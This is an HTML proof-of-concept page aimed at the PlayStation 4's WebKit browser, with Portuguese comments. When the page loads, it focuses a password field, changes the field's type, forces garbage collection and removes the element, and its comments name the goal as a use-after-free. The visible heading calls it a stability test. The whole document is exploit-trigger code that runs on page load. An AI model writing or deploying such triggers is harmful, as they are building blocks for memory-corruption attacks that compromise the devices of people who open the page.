<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 WebKit Test</title>
<script>
// Força a coleta de lixo e pressão de memória no WebKit do PS4
function forceGC() {
    var arr = [];
    for (var i = 0; i < 20000; i++) {
        arr.push(new Array(100));
    }
    arr = null;
    
    // Recursão rápida para estouro de pilha/alocação
    function gcRec(n) {
        if (n < 1) return;
        var temp = { str: "PS4_MEM_PRESSURE_" + n + "_" + Math.random() };
        gcRec(n - 1);
    }
    for (var j = 0; j < 500; j++) gcRec(10);
}

function triggerBug() {
    var input = document.getElementById("target_input");
    if (!input) return;

    // 1. Foca o campo de senha
    input.focus();

    // 2. Altera o tipo do input no meio do ciclo de renderização/foco
    setTimeout(function() {
        input.type = "text";
        
        // 3. Tenta liberar o objeto do elemento interno via GC
        forceGC();
        
        // 4. Remove o elemento do DOM para tentar invalidar os ponteiros internos (Use-After-Free)
        if (input.parentNode) {
            input.parentNode.removeChild(input);
        }
        
        forceGC();
    }, 10);
}

function startTest() {
    // Executa automaticamente ou aguarda interação do usuário
    setTimeout(triggerBug, 500);
}
</script>
</head>
<body onload="startTest()">
    <h2>Teste de Estabilidade WebKit (PS4)</h2>
    <form>
        <input id="target_input" type="password" name="password" autocomplete="current-password">
    </form>
</body>
</html>
